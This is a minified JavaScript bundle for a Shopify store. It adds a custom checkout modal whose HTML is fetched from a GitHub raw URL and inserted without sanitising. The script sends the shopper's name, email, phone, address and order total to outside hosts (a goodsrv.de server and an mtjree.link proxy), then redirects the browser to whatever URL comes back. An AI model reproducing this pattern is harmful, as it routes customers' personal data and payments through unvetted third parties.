// https://bundlejs.com/
var u=e=>/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e),y=e=>/^\d{5}(-\d{4})?$/.test(e),p=window.Shopify&&window.Shopify.shop,g=async()=>{try{let e=await fetch("https://raw.githubusercontent.com/sohepalslamat/shopify-front/refs/heads/main/countries.json");if(!e.ok)throw new Error("Network response was not ok");return await e.json()}catch(e){return console.error("Error fetching countries:",e),[]}},f=e=>e.map(t=>`<option value="${t.code}">${t.name}</option>`).join(""),h=async()=>{try{let e=await fetch("https://raw.githubusercontent.com/sohepalslamat/shopify-front/refs/heads/main/modalContent.html");if(!e.ok)throw new Error("Network response was not ok");let t=await e.text(),o=await g(),n=f(o),a=t.replace("${countryOptionsPlaceholder}",n);document.body.insertAdjacentHTML("beforeend",a)}catch(e){console.error("Error loading modal HTML:",e)}},w=e=>{document.querySelectorAll("#openModal").forEach(t=>{t.onclick=async function(o){o.preventDefault(),I(e,t)}})},d=e=>{e.style.display="none"},v=(e,t)=>{t.onclick=()=>d(e),window.onclick=o=>{o.target===e&&d(e)}},E=(e,t)=>{e.onsubmit=async o=>{o.preventDefault(),N()&&(M(t),await _(),j(t))}},I=async(e,t)=>{let o=B(t);o.status==="guest"?window.location.href="/account/login":k(o),await b(),e.style.display="block"},B=e=>{let t=e.getAttribute("data-customer");return JSON.parse(t)},k=e=>{document.getElementById("firstName").value=e.first_name||"",document.getElementById("lastName").value=e.last_name||"",document.getElementById("email").value=e.email||"",document.getElementById("city").value=e.city||"",document.getElementById("province").value=e.province||"",document.getElementById("country").value=e.country||"",document.getElementById("zip").value=e.zip||"",document.getElementById("address1").value=e.address1||"",document.getElementById("phone").value=e.phone||""},b=async()=>{try{let t=await(await fetch("/cart.js")).json();S(t)}catch(e){console.error("Error fetching cart data:",e),alert("Error fetching cart data. Please try again.")}},S=e=>{let t=e.total_price/100,o=e.currency,n=e.items||[];if(!Array.isArray(n))throw new Error("Items is not an array. Check cart data.");let a=n.map(r=>({title:r.product_title||r.title,price:r.price/100,grams:r.grams||0,quantity:r.quantity,variant_id:r.variant_id,tax_lines:r.tax_lines?r.tax_lines.map(s=>({price:s.price,rate:s.rate,title:s.title})):[]}));window.modalData={total:t.toFixed(2),currency:o,lineItems:a,token:e.token||null}},N=()=>{let e=!0;document.querySelectorAll(".error-message").forEach(m=>{m.style.display="none"});let t=document.getElementById("firstName").value.trim(),o=document.getElementById("lastName").value.trim(),n=document.getElementById("email").value.trim(),a=document.getElementById("city").value.trim(),r=document.getElementById("province").value.trim(),s=document.getElementById("country").value,c=document.getElementById("zip").value.trim(),l=document.getElementById("address1").value.trim(),i=document.getElementById("phone").value.trim();if(t||(document.querySelector('input[name="firstName"] + .error-message').style.display="block",e=!1),o||(document.querySelector('input[name="lastName"] + .error-message').style.display="block",e=!1),(!n||!u(n))&&(document.querySelector('input[name="email"] + .error-message').style.display="block",e=!1),a||(document.querySelector('input[name="city"] + .error-message').style.display="block",e=!1),r||(document.querySelector('input[name="province"] + .error-message').style.display="block",e=!1),s||(document.querySelector('select[name="country"] + .error-message').style.display="block",e=!1),(!c||!y(c))&&(document.querySelector('input[name="zip"] + .error-message').style.display="block",e=!1),l||(document.querySelector('input[name="address1"] + .error-message').style.display="block",e=!1),i||(document.querySelector('input[name="phone"] + .error-message').style.display="block",e=!1),!!e)return e},_=async()=>{let e=q();try{let t=await fetch(`https://shopify.congpt.v2202107122785158474.goodsrv.de/cart_update/${window.dataKey}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});if(t.ok){let o=await t.json();await C(o.checkoutUrl)}else throw new Error("Network response was not ok")}catch(t){console.error("Error creating order:",t),alert("An error occurred while creating the order.")}},q=()=>{let e=document.getElementById("firstName").value.trim(),t=document.getElementById("lastName").value.trim(),o=document.getElementById("email").value.trim(),n=document.getElementById("city").value.trim(),a=document.getElementById("province").value.trim(),r=document.getElementById("country").value,s=document.getElementById("zip").value.trim(),c=document.getElementById("address1").value.trim(),l=document.getElementById("phone").value.trim();return{buyerIdentity:{countryCode:r,phone:l,email:o,deliveryAddressPreferences:[{deliveryAddress:{firstName:e,lastName:t,address1:c,phone:l,city:n,province:a,country:r,zip:s}}]},cartId:`gid://shopify/Cart/${window.modalData.token}`}},C=async e=>{let t={order_id:window.modalData.token,email:document.getElementById("email").value,shop_type:"shopify",shop_url:e,hookUrl:"https://shopify.congpt.v2202107122785158474.goodsrv.de/webhook/8b67370f4efec2ce70c52a007c542aa4/ekhbqf-c1",currency:window.modalData.currency,total:window.modalData.total,timestamp:new Date().getTime(),first_name:document.getElementById("firstName").value,last_name:document.getElementById("lastName").value,country:document.getElementById("country").value,city:document.getElementById("city").value,billing_address:"not included",postcode:document.getElementById("zip").value,fail_url:`https://${p}/cart`,customer_id:"1",phone:document.getElementById("phone").value};try{let o=await fetch("https://mtjree.link/wp-json/custom/v1/proxy",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)});if(o.ok){let n=await o.json();n.url?window.location.href=n.url:alert("Unexpected response. Information not received.")}else throw new Error("Network response was not ok")}catch(o){console.error("Error sending data:",o),alert("An error occurred while sending data. Please try again.")}},M=e=>{e.style.display="block"},j=e=>{e.style.display="none"},O=async()=>{await h();let e=document.getElementById("modalFormContainer"),t=document.getElementById("closeModal"),o=document.getElementById("customerInfoForm"),n=document.getElementById("loadingOverlay");w(e),v(e,t),E(o,n)};document.addEventListener("DOMContentLoaded",function(){let e=document.currentScript||document.querySelector("script[data-code]");if(e){let t=e.getAttribute("data-code");window.dataKey=t}else console.log("Script tag not found, or currentScript is not supported in this context.");O()});
